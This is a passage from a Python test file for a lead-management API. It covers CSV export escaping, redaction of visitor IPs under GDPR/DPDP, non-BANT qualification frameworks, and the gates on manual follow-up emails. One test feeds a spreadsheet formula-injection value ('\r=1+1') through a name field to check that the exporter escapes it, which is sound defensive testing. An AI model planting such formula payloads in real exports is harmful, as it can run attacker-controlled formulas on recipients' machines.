        A bare CR inside a quoted field is a line terminator to ``csv.reader``'s
        universal-newline handling, so round-tripping it through the parser
        would be testing the stdlib rather than the escape. The bytes on the
        wire are what the recipient's spreadsheet sees, so assert on those.
        """
        chat_session = _make_session_row("s1")
        lead_info = _export_lead_info(name="\r=1+1")

        response = _call_export(monkeypatch, chat_session, lead_info, attribution=False)
        assert response.status_code == 200, response.text

        # Quoted by the writer (it contains a line-terminator character) AND
        # prefixed with the escape, so the cell can neither break the record
        # apart nor start with a formula trigger.
        assert '"\'\r=1+1"' in response.text
        assert "\n\r=1+1" not in response.text


# ── GET /leads/export. Visitor IP redaction ─────────────────────────────────
#
# ``ChatSession.location`` is stored as "<City>, <Country> | <IP>". This route
# used to write that column verbatim, so the one export that emits EVERY lead in
# a workspace also emitted every visitor's IP address. Into a file that gets
# mailed around and imported into a CRM. A visitor IP is personal data under
# GDPR and under India's DPDP Act, where this product's basis is consent-only.
#
# The dashboard beside it had been stripping the IP the whole time, which is the
# shape of the bug: two copies of one rule, only one of them correct. Both now
# call ``core.visitor_privacy``; these tests pin the file, and
# ``tests/core/test_visitor_privacy.py`` pins the rule.

_EXPORT_IPV4 = "103.21.244.12"
_EXPORT_IPV6 = "2401:4900:88b1:7265:cdd1:3f28:b37:8f91"


class TestExportVisitorIpRedaction:
    @pytest.mark.parametrize(
        ("stored", "address", "expected_cell"),
        [
            (f"Mumbai, India | {_EXPORT_IPV4}", _EXPORT_IPV4, "Mumbai, India"),
            (f"Mumbai, India | {_EXPORT_IPV6}", _EXPORT_IPV6, "Mumbai, India"),
            # No city from the vendor, the country still has to survive.
            (f"India | {_EXPORT_IPV4}", _EXPORT_IPV4, "India"),
        ],
    )
    def test_a_resolved_location_exports_its_geography_without_the_address(
        self, monkeypatch, stored, address, expected_cell
    ):
        """The headline: the customer keeps the city, the visitor keeps their IP."""
        chat_session = _make_session_row("s1", location=stored, device="iPhone")

        response = _call_export(monkeypatch, chat_session, _export_lead_info(), attribution=False)
        assert response.status_code == 200, response.text

        header, row = _export_rows(response)
        assert row[header.index("Location")] == expected_cell
        # Not just absent from its own column. Absent from the whole file, so a
        # future column that reaches for the raw value fails here too.
        assert address not in response.text

    def test_the_pre_resolution_stamp_exports_as_an_empty_cell(self, monkeypatch):
        """``"IP: 1.2.3.4"`` is all address and no geography.

        Every session wears this shape until the background geo lookup lands,
        and keeps it forever if both vendors fail, so this is not a rare path.
        There is nothing to report, and a file reports nothing with a blank.
        """
        chat_session = _make_session_row("s1", location=f"IP: {_EXPORT_IPV4}", device="iPhone")

        response = _call_export(monkeypatch, chat_session, _export_lead_info(), attribution=False)
        assert response.status_code == 200, response.text

        header, row = _export_rows(response)
        assert row[header.index("Location")] == ""
        assert _EXPORT_IPV4 not in response.text

    def test_a_location_with_no_ip_component_still_round_trips(self, monkeypatch):
        """Redaction must not cost a customer a real place name.

        ``_is_resolver_owned_location`` leaves manually-set values alone, so a
        bare place name can live in this column permanently.
        """
        chat_session = _make_session_row("s1", location="Mumbai, India", device="iPhone")

        response = _call_export(monkeypatch, chat_session, _export_lead_info(), attribution=False)
        assert response.status_code == 200, response.text

        header, row = _export_rows(response)
        assert row[header.index("Location")] == "Mumbai, India"

    @pytest.mark.parametrize("stored", [None, "", "   "])
    def test_an_absent_location_stays_an_empty_cell(self, monkeypatch, stored):
        """Guards d72fee4, which chose the empty cell over the word "Unknown".

        Both downloads had to agree on how they spell a missing value: a CRM
        importing the literal "Unknown" creates a country by that name. Routing
        this column through a formatter whose display answer IS "Unknown" is
        exactly how that regression would come back, so it is pinned here,
        including for the whitespace-only value the old ``or ""`` would have
        passed through as a stray blank.
        """
        chat_session = _make_session_row("s1", location=stored, device="iPhone")

        response = _call_export(monkeypatch, chat_session, _export_lead_info(), attribution=False)
        assert response.status_code == 200, response.text

        header, row = _export_rows(response)
        assert row[header.index("Location")] == ""
        assert "Unknown" not in response.text


# ── GET /leads/export. Non-BANT qualification frameworks ────────────────────


class TestExportAcrossFrameworks:
    """A bot's framework is whatever ``bant_config["framework"]`` names.

    ``build_lead_response`` emits that framework's real dimensions, so for
    anything other than BANT there is no ``need`` key to read. The export used
    to index the four BANT names directly and 500 on every such bot.
    """

    @pytest.mark.parametrize("framework", ["meddic", "champ", "gpctba_ci"])
    def test_export_succeeds_for_a_non_bant_bot(self, monkeypatch, framework: str):
        """Regression: this raised ``KeyError: 'need'`` → unhandled 500.

        Every customer on one of these frameworks was locked out of exporting
        their leads entirely, not a degraded file, no file at all.
        """
        response = _call_export(
            monkeypatch,
            _make_session_row("s1"),
            _export_lead_info(),
            attribution=False,
            bant_config={"framework": framework},
        )

        assert response.status_code == 200, response.text

    def test_export_keeps_its_column_shape_for_a_non_bant_bot(self, monkeypatch):
        """The four BANT columns come back empty rather than absent.

        Deliberate: one file shape for every account means a customer's saved
        import mapping keeps working when they switch a bot's framework, and an
        agency can concatenate exports across bots. Emitting each framework's
        own dimensions would be more informative but changes what the columns
        mean per row, a product decision, tracked separately from this fix.
        """
        response = _call_export(
            monkeypatch,
            _make_session_row("s1"),
            _export_lead_info(),
            attribution=False,
            bant_config={"framework": "meddic"},
        )
        assert response.status_code == 200, response.text

        header, row = _export_rows(response)
        for column in ("Need", "Budget", "Authority", "Timeline"):
            assert row[header.index(column)] == "", column
        # Everything outside the qualification block is unaffected.
        assert row[header.index("Email")] == "priya@infosys.com"
        assert row[header.index("Session ID")] == "s1"

    def test_export_still_fills_the_bant_columns_for_a_bant_bot(self, monkeypatch):
        """The fix must not blank the columns for the framework that has them."""
        chat_session = _make_session_row(
            "s1",
            bant_need="Critical / blocking",
            bant_budget="Approved",
        )

        response = _call_export(monkeypatch, chat_session, _export_lead_info(), attribution=False)
        assert response.status_code == 200, response.text

        header, row = _export_rows(response)
        assert row[header.index("Need")] == "Critical / blocking"
        assert row[header.index("Budget")] == "Approved"


# ── Manual follow-up (the four gates) ────────────────────────────────────────
#
# There is no automatic or timed send anywhere in this system, an operator
# triggers this from the Admin Panel, and every gate below runs at click
# time. See docs/superpowers/plans/2026-08-08-visitor-intelligence.md §02.


def _lead_info(**overrides):
    base = dict(
        email="gaurav@fynix.digital",
        name="Gaurav",
        phone=None,
        company="fynix.digital",
        is_valid_email=True,
        email_score=None,
        company_name=None,
        company_description=None,
        company_logo_url=None,
        last_followup_sent_at=None,
        followup_sent_by_operator_id=None,
    )
    base.update(overrides)
    return SimpleNamespace(**base)


def _chat_session_row(bot_id: int = 1):
    return SimpleNamespace(id="lead-1", bot_id=bot_id)


def _bot_row(bot_id: int = 1, followup_sending_paused: bool = False):
    return SimpleNamespace(id=bot_id, followup_sending_paused=followup_sending_paused)


class TestSendManualFollowUp:
    def test_gate1_blocks_when_no_lead_info(self, monkeypatch):
        from app.api import lead_routes

        session = MagicMock()
        _install_scalars_chain(session, [1], _chat_session_row(), None)
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        with patch("app.api.lead_routes.send_email_async") as mock_send:
            response = TestClient(_build_app(auth_override=_client_auth())).post("/leads/lead-1/follow-up")

        assert response.status_code == 400
        assert "not eligible" in response.json()["detail"].lower()
        mock_send.assert_not_called()

    def test_gate1_blocks_when_email_not_validated_safe(self, monkeypatch):
        from app.api import lead_routes

        session = MagicMock()
        _install_scalars_chain(session, [1], _chat_session_row(), _lead_info(is_valid_email=False))
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        with patch("app.api.lead_routes.send_email_async") as mock_send:
            response = TestClient(_build_app(auth_override=_client_auth())).post("/leads/lead-1/follow-up")

        assert response.status_code == 400
        mock_send.assert_not_called()

    def test_gate1_soft_blocks_when_email_never_validated(self, monkeypatch):
        """``None`` means "never validated", NOT "known bad".

        It must not send unprompted (409, not 200), but it must stay
        recoverable via confirm_override. Treating it as a hard 400 the way
        this gate originally did permanently locked follow-up for every lead
        captured before validation existed, with no way out.
        """
        from app.api import lead_routes

        session = MagicMock()
        _install_scalars_chain(session, [1], _chat_session_row(), _lead_info(is_valid_email=None))
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        with patch("app.api.lead_routes.send_email_async") as mock_send:
            response = TestClient(_build_app(auth_override=_client_auth())).post("/leads/lead-1/follow-up")

        assert response.status_code == 409
        assert "deliverability" in response.json()["detail"].lower()
        mock_send.assert_not_called()

    def test_gate1_unvalidated_email_sends_with_override(self, monkeypatch):
        """The operator can see the address on screen, an explicit confirm
        is enough to take responsibility for an unvalidated one."""
        from app.api import lead_routes

        lead = _lead_info(is_valid_email=None)
        session = MagicMock()
        _install_scalars_chain(
            session,
            [1],
            _chat_session_row(),
            lead,
            None,  # not suppressed
            _bot_row(),  # not paused
        )
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        with patch("app.api.lead_routes.send_email_async") as mock_send:
            response = TestClient(_build_app(auth_override=_client_auth())).post(
                "/leads/lead-1/follow-up", json={"confirm_override": True}
            )

        assert response.status_code == 200
        mock_send.assert_called_once()

    def test_gate1_hard_blocks_known_bad_email_even_with_override(self, monkeypatch):
        """is_valid_email=False is Reoon positively flagging junk. No
        override. This is the case that gets a sending domain blacklisted."""
        from app.api import lead_routes

        session = MagicMock()
        _install_scalars_chain(session, [1], _chat_session_row(), _lead_info(is_valid_email=False))
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        with patch("app.api.lead_routes.send_email_async") as mock_send:
            response = TestClient(_build_app(auth_override=_client_auth())).post(
                "/leads/lead-1/follow-up", json={"confirm_override": True}
            )

        assert response.status_code == 400
        mock_send.assert_not_called()

    def test_gate2_blocks_recent_followup_without_override(self, monkeypatch):
        from app.api import lead_routes

        recent = datetime.now(UTC) - timedelta(days=1)
        session = MagicMock()
        _install_scalars_chain(session, [1], _chat_session_row(), _lead_info(last_followup_sent_at=recent))
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        with patch("app.api.lead_routes.send_email_async") as mock_send:
            response = TestClient(_build_app(auth_override=_client_auth())).post("/leads/lead-1/follow-up")

        assert response.status_code == 409
        mock_send.assert_not_called()

    def test_gate2_allows_override_past_cooldown(self, monkeypatch):
        from app.api import lead_routes

        recent = datetime.now(UTC) - timedelta(days=1)
        session = MagicMock()
        _install_scalars_chain(
            session,
            [1],
            _chat_session_row(),
            _lead_info(last_followup_sent_at=recent),
            None,  # not suppressed
            _bot_row(),  # not paused
        )
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        with patch("app.api.lead_routes.send_email_async") as mock_send:
            response = TestClient(_build_app(auth_override=_client_auth())).post(
                "/leads/lead-1/follow-up", json={"confirm_override": True}
            )

        assert response.status_code == 200
        mock_send.assert_called_once()

    def test_gate3_blocks_suppressed_email_with_no_override(self, monkeypatch):
        from app.api import lead_routes

        session = MagicMock()
        _install_scalars_chain(
            session,
            [1],
            _chat_session_row(),
            _lead_info(),
            SimpleNamespace(bot_id=1, email="gaurav@fynix.digital"),  # suppressed row found
        )
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        with patch("app.api.lead_routes.send_email_async") as mock_send:
            response = TestClient(_build_app(auth_override=_client_auth())).post("/leads/lead-1/follow-up")

        assert response.status_code == 403
        assert "unsubscribed" in response.json()["detail"].lower()
        mock_send.assert_not_called()

    def test_gate4_blocks_when_bot_paused(self, monkeypatch):
        from app.api import lead_routes

        session = MagicMock()
        _install_scalars_chain(
            session,
            [1],
            _chat_session_row(),
            _lead_info(),
            None,  # not suppressed
            _bot_row(followup_sending_paused=True),
        )
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        with patch("app.api.lead_routes.send_email_async") as mock_send:
            response = TestClient(_build_app(auth_override=_client_auth())).post("/leads/lead-1/follow-up")

        assert response.status_code == 423
        assert "paused" in response.json()["detail"].lower()
        mock_send.assert_not_called()

    def test_all_gates_pass_sends_and_records_operator_and_timestamp(self, monkeypatch):
        from app.api import lead_routes

        lead = _lead_info()
        session = MagicMock()
        _install_scalars_chain(
            session,
            [1],
            _chat_session_row(),
            lead,
            None,  # not suppressed
            _bot_row(),  # not paused
        )
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        with patch("app.api.lead_routes.send_email_async") as mock_send:
            response = TestClient(_build_app(auth_override=_operator_auth(operator_id=7))).post(
                "/leads/lead-1/follow-up"
            )

        assert response.status_code == 200
        mock_send.assert_called_once()
        assert lead.last_followup_sent_at is not None
        assert lead.followup_sent_by_operator_id == 7

    def test_lead_not_found_returns_404(self, monkeypatch):
        from app.api import lead_routes

        session = MagicMock()
        _install_scalars_chain(session, [1], None)
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        response = TestClient(_build_app(auth_override=_client_auth())).post("/leads/lead-1/follow-up")

        assert response.status_code == 404


class TestVisitorIntelligenceGating:
    def test_follow_up_denied_when_not_professional(self, monkeypatch):
        """send_manual_follow_up now gates on Visitor Intelligence
        (Professional-only), NOT the general lead-intelligence check,
        a Starter/Standard client must be denied even though they pass
        is_lead_intelligence_enabled."""
        from app.api import lead_routes

        monkeypatch.setattr(lead_routes, "is_visitor_intelligence_enabled_for_bot", lambda *_a, **_k: False)

        session = MagicMock()
        _install_scalars_chain(session, [1], _chat_session_row(), _lead_info())
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        with patch("app.api.lead_routes.send_email_async") as mock_send:
            response = TestClient(_build_app(auth_override=_client_auth())).post("/leads/lead-1/follow-up")

        assert response.status_code == 403
        assert "not enabled" in response.json()["detail"].lower()
        mock_send.assert_not_called()

    def test_get_lead_detail_includes_visitor_fields_when_professional(self, monkeypatch):
        from app.api import lead_routes

        monkeypatch.setattr(lead_routes, "is_visitor_intelligence_enabled_for_bot", lambda *_a, **_k: True)

        session = MagicMock()
        lead = _lead_info(is_valid_email=True, email_score=91)
        bot = SimpleNamespace(id=1, client_id=1, bant_enabled=False, bant_config=None)
        chat_session_row = _make_session_row("lead-1", visitor_metadata={"company": "Acme"})
        # execute() order (paid, with visitor intelligence): bot_ids → chat_session → bot → lead_info → messages → signals
        _install_scalars_chain(session, [1], chat_session_row, bot, lead, [], [])
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        response = TestClient(_build_app(auth_override=_client_auth())).get("/leads/lead-1")

        assert response.status_code == 200
        body = response.json()
        assert body["contact"]["is_valid_email"] is True
        assert body["contact"]["email_score"] == 91
        assert body["visitor_metadata"] == {"company": "Acme"}

    def test_get_lead_detail_omits_visitor_fields_when_not_professional(self, monkeypatch):
        from app.api import lead_routes

        monkeypatch.setattr(lead_routes, "is_visitor_intelligence_enabled_for_bot", lambda *_a, **_k: False)

        session = MagicMock()
        lead = _lead_info(is_valid_email=True, email_score=91)
        bot = SimpleNamespace(id=1, client_id=1, bant_enabled=False, bant_config=None)
        chat_session_row = _make_session_row("lead-1", visitor_metadata={"company": "Acme"})
        # execute() order (paid, without visitor intelligence): bot_ids → chat_session → bot → lead_info → messages → signals
        _install_scalars_chain(session, [1], chat_session_row, bot, lead, [], [])
        monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))

        response = TestClient(_build_app(auth_override=_client_auth())).get("/leads/lead-1")

        assert response.status_code == 200
        body = response.json()
        assert "is_valid_email" not in body["contact"]
        assert "visitor_metadata" not in body
